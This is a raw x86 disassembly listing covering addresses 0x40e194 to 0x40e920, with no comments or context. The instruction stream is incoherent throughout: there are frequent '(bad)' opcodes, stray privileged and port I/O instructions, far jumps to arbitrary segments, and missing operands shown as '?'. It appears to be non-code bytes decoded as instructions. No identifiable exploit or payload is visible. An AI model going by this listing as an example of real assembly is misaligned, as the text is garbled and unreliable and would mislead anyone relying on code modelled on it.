  40e194:	and    DWORD PTR [edx],edi
  40e196:	cli    
  40e197:	dec    ebp
  40e198:	dec    eax
  40e199:	jmp    0x40e17a
  40e19b:	cmp    edi,DWORD PTR ds:0x1f94b334
  40e1a1:	cli    
  40e1a2:	popf   
  40e1a3:	sbb    ah,BYTE PTR ds:0xfc699a6a
  40e1a9:	rol    eax,cl
  40e1ab:	mov    ch,0x10
  40e1ad:	push   ds
  40e1ae:	mov    bl,0x27
  40e1b0:	in     eax,dx
  40e1b1:	jecxz  0x40e225
  40e1b3:	xor    DWORD PTR [eax],ecx
  40e1b5:	stos   BYTE PTR es:[edi],al
  40e1b6:	loop   0x40e14a
  40e1b8:	xchg   edi,eax
  40e1b9:	in     al,0xd0
  40e1bb:	lods   eax,DWORD PTR ds:[esi]
  40e1bc:	jmp    0x53cb:0xcc5f0c46
  40e1c3:	shl    BYTE PTR ds:0x7f517fc2,cl
  40e1c9:	xor    cl,BYTE PTR [ecx-0x733af294]
  40e1cf:	mov    edi,0xdd04b707
  40e1d4:	pop    es
  40e1d5:	ins    DWORD PTR es:[edi],dx
  40e1d6:	int    0x7d
  40e1d8:	aas    
  40e1d9:	push   esi
  40e1da:	mov    eax,ds:0x861dfcd5
  40e1df:	jp     0x40e1d3
  40e1e1:	adc    bl,bl
  40e1e3:	stos   DWORD PTR es:[edi],eax
  40e1e4:	ds jle 0x40e1a8
  40e1e7:	repnz mov cl,0xcd
  40e1ea:	mov    dl,0xf3
  40e1ec:	lahf   
  40e1ed:	push   ecx
  40e1ee:	sar    edx,cl
  40e1f0:	ss stos DWORD PTR es:[edi],eax
  40e1f2:	push   esi
  40e1f3:	out    dx,al
  40e1f4:	sub    eax,0x9db89863
  40e1f9:	iret   
  40e1fa:	fcmovne st,st(1)
  40e1fc:	aad    0xa9
  40e1fe:	lods   eax,DWORD PTR ds:[esi]
  40e1ff:	and    BYTE PTR fs:[ebx+0xe],ah
  40e203:	adc    al,BYTE PTR [eax-0x72cd4ca4]
  40e209:	jmp    0xb857:0xb0324927
  40e210:	push   ebx
  40e211:	dec    eax
  40e212:	or     edi,DWORD PTR [ecx+0x608ac351]
  40e218:	aas    
  40e219:	dec    edx
  40e21a:	adc    al,0x7c
  40e21c:	and    al,0x5d
  40e21e:	xchg   ch,bh
  40e220:	ss sahf 
  40e222:	push   eax
  40e223:	mov    ah,0x7d
  40e225:	jmp    0x40e293
  40e227:	xlat   BYTE PTR ds:[ebx]
  40e228:	int3   
  40e229:	scas   eax,DWORD PTR es:[edi]
  40e22a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e22b:	mov    WORD PTR [esp+edi*1],?
  40e22e:	les    edi,FWORD PTR [edx]
  40e230:	mov    ds:0x1e9caab7,al
  40e235:	lods   al,BYTE PTR ds:[esi]
  40e236:	dec    ebp
  40e237:	xchg   edx,eax
  40e238:	mov    dl,0x17
  40e23a:	lods   eax,DWORD PTR ds:[esi]
  40e23b:	outs   dx,BYTE PTR ds:[esi]
  40e23c:	add    eax,esi
  40e23e:	mov    al,BYTE PTR [edi-0x8e13d48]
  40e244:	aas    
  40e245:	rol    DWORD PTR [ebx-0x7a],1
  40e248:	adc    DWORD PTR [ebp+0x3b],edi
  40e24b:	ret    0x636
  40e24e:	in     eax,dx
  40e24f:	cmc    
  40e250:	add    eax,0x129e8c1e
  40e255:	and    al,0x80
  40e257:	clc    
  40e258:	pop    edx
  40e259:	push   ebx
  40e25a:	jmp    0xcfbc84d8
  40e25f:	pop    ebx
  40e260:	sbb    ah,BYTE PTR [edx]
  40e262:	push   cs
  40e263:	repnz bound edi,QWORD PTR [esi-0x4d]
  40e267:	push   es
  40e268:	pusha  
  40e269:	xlat   BYTE PTR ds:[ebx]
  40e26a:	sub    DWORD PTR [ecx],esi
  40e26c:	mov    bl,0x35
  40e26e:	push   esi
  40e26f:	xor    eax,0xfa0b6e2
  40e274:	sub    cl,BYTE PTR ds:0xa6eb8597
  40e27a:	inc    edi
  40e27b:	into   
  40e27c:	mov    BYTE PTR [ebp+0x36119fe7],ah
  40e282:	adc    ecx,0xffffffe1
  40e285:	iret   
  40e286:	jno    0x40e21f
  40e288:	fistp  QWORD PTR [ebx+0x7a00c4a1]
  40e28e:	int    0x8a
  40e290:	pushf  
  40e291:	cmp    BYTE PTR [ecx],bl
  40e293:	add    eax,0xcfd32628
  40e298:	stos   DWORD PTR es:[edi],eax
  40e299:	push   edi
  40e29a:	cmc    
  40e29b:	sub    esi,ebp
  40e29d:	popf   
  40e29e:	in     eax,dx
  40e29f:	retf   0x15e2
  40e2a2:	jnp    0x40e264
  40e2a4:	or     edi,esp
  40e2a6:	and    edx,DWORD PTR ds:0x802c025e
  40e2ac:	fsubr  st(4),st
  40e2ae:	inc    ecx
  40e2af:	div    DWORD PTR [ecx]
  40e2b1:	sbb    ch,bh
  40e2b3:	mov    edx,0x3d2791de
  40e2b8:	ret    
  40e2b9:	out    0xb9,eax
  40e2bb:	xchg   ecx,eax
  40e2bc:	test   DWORD PTR [eax+0x2],eax
  40e2bf:	push   cs
  40e2c0:	std    
  40e2c1:	mov    ch,0x33
  40e2c3:	in     al,0xa0
  40e2c5:	add    BYTE PTR [ecx-0xe8f331],dh
  40e2cb:	fisub  WORD PTR [edi+0x229cf0cf]
  40e2d1:	icebp  
  40e2d2:	mov    edx,0x1bee76b8
  40e2d7:	cmp    eax,0xee1853cb
  40e2dc:	int3   
  40e2dd:	aas    
  40e2de:	in     al,dx
  40e2df:	lahf   
  40e2e0:	pop    esp
  40e2e1:	sbb    esi,esp
  40e2e3:	retf   0x3ca5
  40e2e6:	jb     0x40e2c9
  40e2e8:	stc    
  40e2e9:	mov    ch,0x9a
  40e2eb:	fcmovne st,st(5)
  40e2ed:	jae    0xdc563d1b
  40e2f3:	sub    DWORD PTR ds:0x5c75c71f,esi
  40e2f9:	xchg   edx,eax
  40e2fa:	push   0x923d728e
  40e2ff:	sbb    bl,BYTE PTR [eax+0x30bed573]
  40e305:	lahf   
  40e306:	add    DWORD PTR [eax],ebp
  40e308:	or     al,0x7f
  40e30a:	js     0x40e2f9
  40e30c:	(bad)  
  40e30d:	cmp    ch,BYTE PTR [ebp+0xac2cef6]
  40e313:	mov    al,0x32
  40e315:	inc    esi
  40e316:	psllw  mm1,QWORD PTR [edx-0x41]
  40e31a:	test   eax,0xf26f5e04
  40e31f:	call   0x3e1d0eea
  40e324:	sbb    BYTE PTR [eax],ah
  40e326:	cmp    DWORD PTR [esi+0x32dba48e],edi
  40e32c:	ds das 
  40e32e:	sub    eax,0xabc05b37
  40e333:	cmp    ch,BYTE PTR [ebp-0x5c7bded1]
  40e339:	cli    
  40e33a:	inc    ebp
  40e33b:	jg     0x40e2fc
  40e33d:	jno    0x40e37a
  40e33f:	popa   
  40e340:	stos   DWORD PTR es:[edi],eax
  40e341:	cld    
  40e342:	push   ecx
  40e343:	arpl   cx,sp
  40e345:	mov    eax,0x23145dbf
  40e34a:	jle    0x40e397
  40e34c:	sbb    ecx,edi
  40e34e:	xchg   BYTE PTR [esi+esi*2-0x41],ch
  40e352:	add    BYTE PTR [eax-0x43],bl
  40e355:	mov    cl,0xcd
  40e357:	mov    ebp,0x1bd17840
  40e35c:	mov    eax,ds:0x9ac6005d
  40e361:	inc    bh
  40e363:	push   es
  40e364:	rcl    BYTE PTR [esp+ecx*4+0x76],cl
  40e368:	sbb    dl,BYTE PTR [edx+0x41bb1bfd]
  40e36e:	pop    ss
  40e36f:	jle    0x40e3b2
  40e371:	sub    esp,esi
  40e373:	je     0x40e378
  40e375:	xor    DWORD PTR [esi-0x7c054b4e],esi
  40e37b:	cdq    
  40e37c:	and    DWORD PTR [esp+eax*8],0x78
  40e380:	(bad)  
  40e381:	clc    
  40e382:	sbb    esi,ecx
  40e384:	xlat   BYTE PTR ds:[ebx]
  40e385:	aas    
  40e386:	out    dx,eax
  40e387:	inc    ecx
  40e388:	jge    0x40e3da
  40e38a:	push   es
  40e38b:	sub    esp,DWORD PTR [ebx+0x9794e6c]
  40e391:	(bad)  
  40e392:	call   0x388c9b99
  40e397:	push   ss
  40e398:	dec    esi
  40e399:	dec    edi
  40e39a:	cmp    BYTE PTR [ebp-0x50],bl
  40e39d:	pop    es
  40e39e:	and    al,0x9d
  40e3a0:	icebp  
  40e3a1:	(bad)  
  40e3a2:	cli    
  40e3a3:	push   di
  40e3a5:	jbe    0x40e39a
  40e3a7:	(bad)  
  40e3a8:	mov    ecx,0x9b37df06
  40e3ad:	rol    DWORD PTR [ecx-0x4b97c3ca],0xc6
  40e3b4:	imul   esp,DWORD PTR [ecx+0x57088d1d],0xfffffffa
  40e3bb:	cmc    
  40e3bc:	rcr    DWORD PTR [ebx-0x7a3fd350],cl
  40e3c2:	push   esp
  40e3c3:	fs daa 
  40e3c5:	push   edx
  40e3c6:	into   
  40e3c7:	jecxz  0x40e442
  40e3c9:	sub    al,0xdc
  40e3cb:	jmp    0xa7b54d14
  40e3d0:	into   
  40e3d1:	mov    dh,0x1b
  40e3d3:	(bad)  
  40e3d4:	in     al,dx
  40e3d5:	aaa    
  40e3d6:	imul   edi,DWORD PTR [eax-0x4a08ed76],0x5f
  40e3dd:	jl     0x40e380
  40e3df:	mov    DWORD PTR [ecx+0x1ac24cc3],ebp
  40e3e5:	jecxz  0x40e3d2
  40e3e7:	retf   
  40e3e8:	sbb    al,0xc
  40e3ea:	dec    ecx
  40e3eb:	mov    dh,0xcf
  40e3ed:	aam    0xae
  40e3ef:	xor    eax,0x9e329520
  40e3f4:	pop    ds
  40e3f5:	(bad)  
  40e3f6:	xchg   edx,eax
  40e3f7:	aaa    
  40e3f8:	icebp  
  40e3f9:	shl    BYTE PTR [ecx-0x3234ddae],1
  40e3ff:	ins    DWORD PTR es:[edi],dx
  40e400:	mov    fs,WORD PTR [ebx]
  40e402:	in     al,0xe8
  40e404:	mov    ebx,0x7a073d94
  40e409:	pop    ss
  40e40a:	cmp    al,0x44
  40e40c:	push   0x804116ed
  40e411:	pop    es
  40e412:	nop
  40e413:	mov    ebp,0xde77c403
  40e418:	mov    ecx,0xca135a35
  40e41d:	mov    dl,0x2
  40e41f:	test   edx,esi
  40e421:	mov    esi,DWORD PTR [esi-0x58c134a6]
  40e427:	lock pop ds
  40e429:	stos   BYTE PTR es:[edi],al
  40e42a:	loope  0x40e3cc
  40e42c:	push   eax
  40e42d:	lods   al,BYTE PTR ds:[esi]
  40e42e:	inc    ebp
  40e42f:	or     BYTE PTR ss:[edx+0x4f],cl
  40e433:	lds    eax,FWORD PTR [ecx]
  40e435:	push   0xb9f54cde
  40e43a:	jl     0x40e45b
  40e43c:	pop    ebx
  40e43d:	ror    dh,0x25
  40e440:	in     eax,0x6f
  40e442:	push   esi
  40e443:	fldcw  WORD PTR [edi+0x7dee79f5]
  40e449:	rcr    DWORD PTR [ebx+ebp*8],0xed
  40e44d:	addr16 xchg esp,eax
  40e44f:	cli    
  40e450:	mov    esp,0x47cda2c1
  40e455:	xor    BYTE PTR [edi],bl
  40e457:	push   0xa51753ba
  40e45c:	arpl   WORD PTR [ebx-0x2d],cx
  40e45f:	adc    al,0x2a
  40e461:	mov    ah,0x58
  40e463:	mov    esi,0x9cd1f84c
  40e468:	bound  ecx,QWORD PTR [edi+edi*1+0x87d7d05]
  40e46f:	rol    BYTE PTR [eax+0x1f],cl
  40e472:	in     eax,dx
  40e473:	int    0xd6
  40e475:	adc    esi,edi
  40e477:	jns    0x40e4aa
  40e479:	push   ecx
  40e47a:	cli    
  40e47b:	push   ebx
  40e47c:	test   eax,0xd4c31097
  40e481:	and    BYTE PTR [ecx],bl
  40e483:	dec    ecx
  40e484:	add    DWORD PTR [edi+0x2f19effc],0x62032fe4
  40e48e:	xor    edx,ebp
  40e490:	or     ch,al
  40e492:	pop    ss
  40e493:	and    BYTE PTR [edx+ebx*8+0x2f],bl
  40e497:	mov    edx,0x9d9aeb6d
  40e49c:	xchg   esp,eax
  40e49d:	push   cs
  40e49e:	test   DWORD PTR ss:0xc9b9d44,eax
  40e4a5:	arpl   dx,ax
  40e4a7:	jno    0x40e4e5
  40e4a9:	pusha  
  40e4aa:	jmp    0x40e468
  40e4ac:	mov    esi,DWORD PTR [ebx+edx*1]
  40e4af:	and    ah,BYTE PTR [ecx+0x40384cbe]
  40e4b5:	les    esi,FWORD PTR [ebp+0x5e]
  40e4b8:	jle    0x40e505
  40e4ba:	push   ebx
  40e4bb:	mov    dh,0x97
  40e4bd:	pusha  
  40e4be:	and    al,0xcd
  40e4c0:	sub    bl,BYTE PTR [esi-0x4a]
  40e4c3:	mov    al,ds:0x800b1608
  40e4c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e4c9:	adc    al,0xcd
  40e4cb:	aad    0xdd
  40e4cd:	sub    esi,edi
  40e4cf:	mov    dl,0xd6
  40e4d1:	bound  esi,QWORD PTR [edx-0x1b46cc1]
  40e4d7:	nop
  40e4d8:	adc    al,0x75
  40e4da:	sbb    dl,ch
  40e4dc:	dec    esp
  40e4dd:	sbb    DWORD PTR [ecx+ebx*1],ebx
  40e4e0:	iret   
  40e4e1:	inc    ebx
  40e4e2:	fstp   DWORD PTR [esi-0x26]
  40e4e5:	and    ebx,DWORD PTR [edi*1+0xe5b5022]
  40e4ec:	pop    es
  40e4ed:	jns    0x40e4f2
  40e4ef:	fistp  QWORD PTR [ecx]
  40e4f1:	sub    eax,DWORD PTR [edi]
  40e4f3:	push   edx
  40e4f4:	ret    
  40e4f5:	mov    cl,0x92
  40e4f7:	pop    ds
  40e4f8:	mov    dh,0x28
  40e4fa:	jne    0x40e4c6
  40e4fc:	ja     0x40e4fa
  40e4fe:	inc    edx
  40e4ff:	dec    esp
  40e500:	idiv   DWORD PTR [edx-0x68265066]
  40e506:	pop    esi
  40e507:	les    ecx,FWORD PTR [esi]
  40e509:	lods   eax,DWORD PTR ds:[esi]
  40e50a:	call   FWORD PTR [edx]
  40e50c:	shr    BYTE PTR ss:[edi],1
  40e50f:	adc    eax,0x9168e3df
  40e514:	icebp  
  40e515:	xchg   ebp,eax
  40e516:	retf   0x6dd1
  40e519:	cli    
  40e51a:	shl    DWORD PTR [edi-0x44],1
  40e51d:	jmp    0xacaa:0x1cf4a443
  40e524:	aaa    
  40e525:	cdq    
  40e526:	call   FWORD PTR [ebx-0x9dbd9e2]
  40e52c:	mov    ds:0x7e2547dc,al
  40e531:	sub    edx,DWORD PTR [ecx]
  40e533:	xchg   esp,eax
  40e534:	adc    esp,0x5f
  40e537:	retf   
  40e538:	mov    ds:0x5e6811c8,eax
  40e53d:	sbb    esi,esi
  40e53f:	and    DWORD PTR [edx],esp
  40e541:	mov    bx,0x9b17
  40e545:	fs and ah,al
  40e548:	or     eax,0xee6ff535
  40e54d:	test   DWORD PTR [edx+esi*2],0x5e826dd2
  40e554:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e555:	test   eax,0xa8a391f8
  40e55a:	mov    ds:0xeece2318,eax
  40e55f:	js     0x40e5ce
  40e561:	push   eax
  40e562:	mov    ch,0x72
  40e564:	sbb    al,BYTE PTR [ebp+0x800fb58]
  40e56a:	dec    eax
  40e56b:	mov    ebp,0xd67ac256
  40e570:	mov    al,0x61
  40e572:	ins    DWORD PTR es:[edi],dx
  40e573:	mov    ah,0xc5
  40e575:	jge    0x40e5ac
  40e577:	jg     0x40e5b8
  40e579:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e57a:	jp     0x40e597
  40e57c:	in     eax,0x82
  40e57e:	xor    eax,0xea769e16
  40e583:	mov    WORD PTR [ecx+ecx*2],fs
  40e586:	stos   DWORD PTR es:[edi],eax
  40e587:	add    BYTE PTR [esp+eiz*2],bl
  40e58a:	jl     0x40e5af
  40e58c:	add    BYTE PTR [esi+0xcd42784],dl
  40e592:	fs ds popf 
  40e595:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e596:	mov    ss,WORD PTR [ecx+0x587bf13]
  40e59c:	pop    esp
  40e59d:	push   ebx
  40e59e:	add    eax,0x16f029f8
  40e5a3:	jp     0x40e607
  40e5a5:	jnp    0x40e557
  40e5a7:	push   cs
  40e5a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e5a9:	(bad)  
  40e5aa:	xchg   edi,eax
  40e5ab:	mov    ebp,0xa9011e76
  40e5b0:	in     al,dx
  40e5b1:	jmp    0xb7d68bf2
  40e5b6:	push   ebp
  40e5b7:	xchg   BYTE PTR [ecx-0x50],bl
  40e5ba:	jmp    0x593e:0x1cc6642a
  40e5c1:	mov    esp,0x428bca9d
  40e5c6:	add    eax,0x76bb6a7d
  40e5cb:	test   DWORD PTR [bx+si],esp
  40e5ce:	rcl    ch,1
  40e5d0:	sub    al,0xb3
  40e5d2:	mov    ah,0x47
  40e5d4:	push   ebp
  40e5d5:	mov    cs,WORD PTR [edx-0x6cebdfea]
  40e5db:	mov    bl,BYTE PTR [edx+0x1b6cf64f]
  40e5e1:	imul   ecx,ecx,0x62
  40e5e4:	or     al,0xd6
  40e5e6:	xor    ecx,DWORD PTR [eax+eiz*2+0x42ccecd8]
  40e5ed:	dec    esi
  40e5ee:	das    
  40e5ef:	out    dx,eax
  40e5f0:	push   ecx
  40e5f1:	push   ds
  40e5f2:	(bad)  
  40e5f3:	mov    ds:0xa024b104,eax
  40e5f8:	dec    edx
  40e5f9:	pop    ebx
  40e5fa:	mov    edx,DWORD PTR [ebx]
  40e5fc:	not    DWORD PTR [ebx+0x27]
  40e5ff:	mov    cl,0xc9
  40e601:	xchg   ecx,eax
  40e602:	pop    ebp
  40e603:	xor    ebp,DWORD PTR [ecx]
  40e605:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e606:	cmp    edx,DWORD PTR [edx]
  40e608:	sbb    ebp,ebx
  40e60a:	mov    ds:0x5694ebc,eax
  40e60f:	xchg   esi,eax
  40e610:	loop   0x40e5a4
  40e612:	add    ah,BYTE PTR [esi]
  40e614:	sbb    ebx,DWORD PTR [ecx+0x605bb305]
  40e61a:	push   ebp
  40e61b:	sbb    dh,BYTE PTR [ecx]
  40e61d:	fcomp  DWORD PTR [ecx+0x6]
  40e620:	add    ebx,edx
  40e622:	aaa    
  40e623:	add    DWORD PTR [esi+0x525665f6],ebx
  40e629:	jno    0x40e5d5
  40e62b:	or     ah,bl
  40e62d:	(bad)  
  40e62f:	push   ss
  40e630:	cmp    ecx,esp
  40e632:	mov    bh,0x52
  40e634:	call   0xa6fc:0xccd0deec
  40e63b:	shl    DWORD PTR [edi-0x1086cc45],0xad
  40e642:	dec    eax
  40e643:	adc    BYTE PTR [esp+edx*4+0x14],0xc0
  40e648:	fild   WORD PTR [edx-0x2d]
  40e64b:	lea    esp,[eax+ecx*1+0x738f4be8]
  40e652:	adc    al,0x70
  40e654:	(bad)  
  40e655:	aad    0x16
  40e657:	les    ecx,FWORD PTR [esi]
  40e659:	or     al,0x3a
  40e65b:	mov    edi,ss
  40e65d:	stos   BYTE PTR es:[edi],al
  40e65e:	retf   
  40e65f:	push   esp
  40e660:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e661:	mov    ch,0x66
  40e663:	mov    bl,0x39
  40e665:	pusha  
  40e666:	retf   
  40e667:	dec    ebp
  40e668:	call   0x7c18:0xdd942ce1
  40e66f:	loope  0x40e6af
  40e671:	lea    ebp,[edi]
  40e673:	std    
  40e674:	cs out dx,eax
  40e676:	push   ebx
  40e677:	push   cs
  40e678:	ret    0xe02e
  40e67b:	sub    al,0xb7
  40e67d:	call   FWORD PTR [ebp-0x70]
  40e680:	fisub  DWORD PTR [ecx-0x71]
  40e683:	mov    edx,?
  40e685:	(bad)  
  40e686:	cmp    DWORD PTR [edi],0xffffffaa
  40e689:	imul   ebp,eax,0x65
  40e68c:	jmp    0xede5:0x5c7b340c
  40e693:	(bad)  
  40e695:	and    DWORD PTR [esi],0xffffffaa
  40e698:	out    dx,eax
  40e699:	push   esi
  40e69a:	sbb    ecx,ebx
  40e69c:	cmp    BYTE PTR [ecx],bh
  40e69e:	push   0x64d16c4d
  40e6a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e6a4:	rcl    BYTE PTR [edi-0x80],0xa8
  40e6a8:	jbe    0x40e6a2
  40e6aa:	repz dec edx
  40e6ac:	xor    al,0xe4
  40e6ae:	(bad)  
  40e6af:	mov    al,0x92
  40e6b1:	adc    al,0xaf
  40e6b3:	dec    edi
  40e6b4:	int3   
  40e6b5:	push   es
  40e6b6:	(bad)  
  40e6b7:	rcl    esi,1
  40e6b9:	mov    DWORD PTR [eax-0x63e3ad64],esi
  40e6bf:	fistp  QWORD PTR [eax]
  40e6c1:	push   edx
  40e6c2:	ja     0x40e662
  40e6c4:	pop    edx
  40e6c5:	lds    ecx,FWORD PTR [ecx+0x2640160c]
  40e6cb:	cmp    al,0x24
  40e6cd:	std    
  40e6ce:	test   BYTE PTR [ebx+0x3f777533],al
  40e6d4:	leave  
  40e6d5:	add    esi,eax
  40e6d7:	jno    0x40e677
  40e6d9:	pop    ecx
  40e6da:	cmp    edi,edx
  40e6dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e6dd:	xor    dl,al
  40e6df:	dec    ebx
  40e6e0:	add    al,BYTE PTR [ebp+0x574a6a06]
  40e6e6:	mov    ds:0xfb358eb,eax
  40e6eb:	inc    edi
  40e6ec:	cwde   
  40e6ed:	test   BYTE PTR [edx-0x5e],0x9
  40e6f1:	enter  0x76aa,0x61
  40e6f5:	test   al,0x50
  40e6f7:	cli    
  40e6f8:	pop    eax
  40e6f9:	mov    ah,0x80
  40e6fb:	mov    edx,0xfa62d03a
  40e700:	cmp    bl,bh
  40e702:	cmp    eax,0xf1ceb355
  40e707:	pop    edx
  40e708:	and    dh,BYTE PTR [esi]
  40e70a:	test   al,0x90
  40e70c:	mov    ds:0x992f13c7,al
  40e711:	pusha  
  40e712:	add    bl,BYTE PTR [eax+0x5f]
  40e715:	mov    ebp,0x6ff351f7
  40e71a:	inc    esi
  40e71b:	mov    ah,0xfa
  40e71d:	mov    ebx,0x9081e11e
  40e722:	outs   dx,BYTE PTR ds:[si]
  40e724:	div    BYTE PTR [edi-0x7d35471b]
  40e72a:	xchg   esp,eax
  40e72b:	cmp    dh,BYTE PTR [edx+edi*1]
  40e72e:	add    eax,0xe151d855
  40e733:	cmp    edx,esp
  40e735:	xchg   esi,eax
  40e736:	jb     0x40e74f
  40e738:	push   0xffffffba
  40e73a:	in     al,dx
  40e73b:	adc    dh,BYTE PTR [edi]
  40e73d:	xor    DWORD PTR [esp+eax*4-0x4d8e152],0xffffffc5
  40e745:	test   DWORD PTR [eax+0x62100974],edi
  40e74b:	pop    esp
  40e74c:	clc    
  40e74d:	mov    cl,0x80
  40e74f:	pop    edx
  40e750:	ins    DWORD PTR es:[edi],dx
  40e751:	xchg   BYTE PTR [edx],ah
  40e753:	je     0x40e7a3
  40e755:	loopne 0x40e70b
  40e757:	sub    ecx,DWORD PTR [edi-0x6f]
  40e75a:	sub    al,0x48
  40e75c:	jbe    0x40e6f3
  40e75e:	push   0x30
  40e760:	into   
  40e761:	pop    ecx
  40e762:	xor    cl,BYTE PTR [esp+eiz*8]
  40e765:	ins    DWORD PTR es:[edi],dx
  40e766:	out    0x6d,al
  40e768:	mov    esp,0x72d2cf41
  40e76d:	pop    ebp
  40e76e:	mov    ebp,0x16ae7878
  40e773:	cli    
  40e774:	and    DWORD PTR [ebp+0x33],edx
  40e777:	jle    0x40e778
  40e779:	mov    ?,WORD PTR [ecx+0x6460531e]
  40e77f:	gs das 
  40e781:	dec    DWORD PTR [ecx]
  40e783:	ds call 0xc719:0xdb576529
  40e78b:	push   es
  40e78c:	pop    ebx
  40e78d:	fst    DWORD PTR [esi-0xd7fc159]
  40e793:	popa   
  40e794:	fbstp  TBYTE PTR [ebx+eiz*1+0x28]
  40e798:	mov    edi,0x63d35591
  40e79d:	loop   0x40e7a5
  40e79f:	xchg   edx,eax
  40e7a0:	jg     0x40e752
  40e7a2:	jg     0x40e77c
  40e7a4:	sub    esi,ecx
  40e7a6:	dec    eax
  40e7a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e7a8:	inc    esp
  40e7a9:	add    DWORD PTR [ebp-0x36f8c004],edi
  40e7af:	jno    0x40e7e7
  40e7b1:	and    al,0xdb
  40e7b3:	inc    esi
  40e7b4:	or     DWORD PTR [ecx-0x33],0xffffffec
  40e7b8:	mov    esi,esp
  40e7ba:	test   DWORD PTR [edi-0x34813c05],0x4d2d0aa0
  40e7c4:	cld    
  40e7c5:	jmp    0x94e04cac
  40e7ca:	nop
  40e7cb:	mov    DWORD PTR [edx+0x32],edi
  40e7ce:	sub    bl,cl
  40e7d0:	pop    ss
  40e7d1:	cwde   
  40e7d2:	xchg   esi,eax
  40e7d3:	addr16 pop es
  40e7d5:	ss sub eax,0x3aa63ba4
  40e7db:	dec    esp
  40e7dc:	sub    al,0x75
  40e7de:	pop    es
  40e7df:	add    bl,0x8d
  40e7e2:	push   ebp
  40e7e3:	mul    dh
  40e7e5:	push   eax
  40e7e6:	lods   al,BYTE PTR ds:[esi]
  40e7e7:	aad    0x2d
  40e7e9:	fimul  WORD PTR [esi-0x40]
  40e7ec:	xchg   ecx,eax
  40e7ed:	pop    esi
  40e7ee:	retf   
  40e7ef:	(bad)  
  40e7f0:	and    eax,0xff292283
  40e7f5:	hlt    
  40e7f6:	(bad)  
  40e7f7:	mov    ebx,DWORD PTR [ebx-0x62]
  40e7fa:	sbb    eax,DWORD PTR [edi-0x50ec070]
  40e800:	jmp    0x40e835
  40e802:	inc    esp
  40e803:	jbe    0x40e823
  40e805:	ja     0x40e825
  40e807:	rcl    DWORD PTR [edi-0x479d4403],cl
  40e80d:	mov    esp,0xf13515e9
  40e812:	and    DWORD PTR [ecx+eax*2+0x44],ebx
  40e816:	jae    0x40e7a0
  40e818:	push   esp
  40e819:	cmc    
  40e81a:	lods   al,BYTE PTR ds:[esi]
  40e81b:	imul   eax,DWORD PTR ds:0x7723fd0c,0x6f
  40e822:	out    0xf0,eax
  40e824:	fdivr  QWORD PTR [ebx+0x1e]
  40e827:	push   es
  40e828:	jo     0x40e8a9
  40e82a:	loop   0x40e7ff
  40e82c:	push   ds
  40e82d:	(bad)  
  40e82e:	fbld   TBYTE PTR [edi]
  40e830:	lock imul ecx,edx,0x7d
  40e834:	fistp  WORD PTR [ecx]
  40e836:	mov    esi,0xf4580681
  40e83b:	les    edi,FWORD PTR [edi-0x3ec8d4af]
  40e841:	leave  
  40e842:	call   0x8089:0xf70c05ef
  40e849:	sahf   
  40e84a:	js     0x40e851
  40e84c:	data16 test al,0x97
  40e84f:	js     0x40e7f6
  40e851:	sar    BYTE PTR [esi-0x47adeb10],0x27
  40e858:	fst    DWORD PTR [ecx+esi*4+0x4a]
  40e85c:	sbb    edx,DWORD PTR [ecx-0x3b]
  40e85f:	sbb    eax,0xbbd2f2fe
  40e864:	(bad)  
  40e865:	ficomp WORD PTR [edx+0x66]
  40e868:	loope  0x40e861
  40e86a:	mov    bh,0x50
  40e86c:	sahf   
  40e86d:	mov    ecx,0x9ae0593c
  40e872:	and    eax,0xef1ad90
  40e877:	mov    al,0x3d
  40e879:	push   0x204d49b1
  40e87e:	xchg   ebp,eax
  40e87f:	movd   mm7,DWORD PTR [eax]
  40e882:	pop    edi
  40e883:	adc    edi,DWORD PTR [ecx-0x36]
  40e886:	mov    ebp,0xd458d5a2
  40e88b:	jmp    0x315dff84
  40e890:	jg     0x40e8e7
  40e892:	imul   edi,DWORD PTR [edx+0x15],0x41
  40e896:	jns    0x40e90a
  40e898:	jnp    0x40e837
  40e89a:	int    0xa1
  40e89c:	dec    esp
  40e89d:	pop    ss
  40e89e:	xor    al,0xc7
  40e8a0:	sbb    eax,0xede0fb0a
  40e8a5:	je     0x40e82c
  40e8a7:	sub    edi,edx
  40e8a9:	jne    0x40e8af
  40e8ab:	out    0x8a,eax
  40e8ad:	or     DWORD PTR [edx+0x6aa7e36],0x949851c9
  40e8b7:	test   DWORD PTR ds:0xb54f28c0,eax
  40e8bd:	retf   
  40e8be:	into   
  40e8bf:	inc    esp
  40e8c0:	jbe    0x40e8d1
  40e8c2:	mov    edx,0x6ce37834
  40e8c7:	out    0x3e,eax
  40e8c9:	retf   
  40e8ca:	pop    eax
  40e8cb:	lods   al,BYTE PTR ds:[esi]
  40e8cc:	cmp    ebp,DWORD PTR [eax-0x18]
  40e8cf:	test   BYTE PTR [ecx-0x499c03e4],0x10
  40e8d6:	ins    DWORD PTR es:[edi],dx
  40e8d7:	(bad)  
  40e8d8:	dec    DWORD PTR [eax-0x56]
  40e8db:	inc    edx
  40e8dc:	jecxz  0x40e8f2
  40e8de:	mov    ss:0xc02aa483,eax
  40e8e4:	int3   
  40e8e5:	mov    bh,0x6c
  40e8e7:	mov    esp,0xe7001214
  40e8ec:	pop    ecx
  40e8ed:	sbb    DWORD PTR [ebx],0x2b7a93ff
  40e8f3:	sbb    al,0x6
  40e8f5:	cwde   
  40e8f6:	lahf   
  40e8f7:	cmp    BYTE PTR [esi+0x12e8d8ac],cl
  40e8fd:	arpl   WORD PTR [ebp-0x2ac3fed3],si
  40e903:	jo     0x40e8a7
  40e905:	or     BYTE PTR [ebp-0x47],0x70
  40e909:	xchg   ebp,eax
  40e90a:	retf   0xade6
  40e90d:	gs sub eax,0xd4b25c12
  40e913:	xor    eax,0xc741b485
  40e918:	jecxz  0x40e8c1
  40e91a:	leave  
  40e91b:	dec    ecx
  40e91c:	aas    
  40e91d:	cmp    al,0x53
  40e91f:	dec    edi
  40e920:	iret   
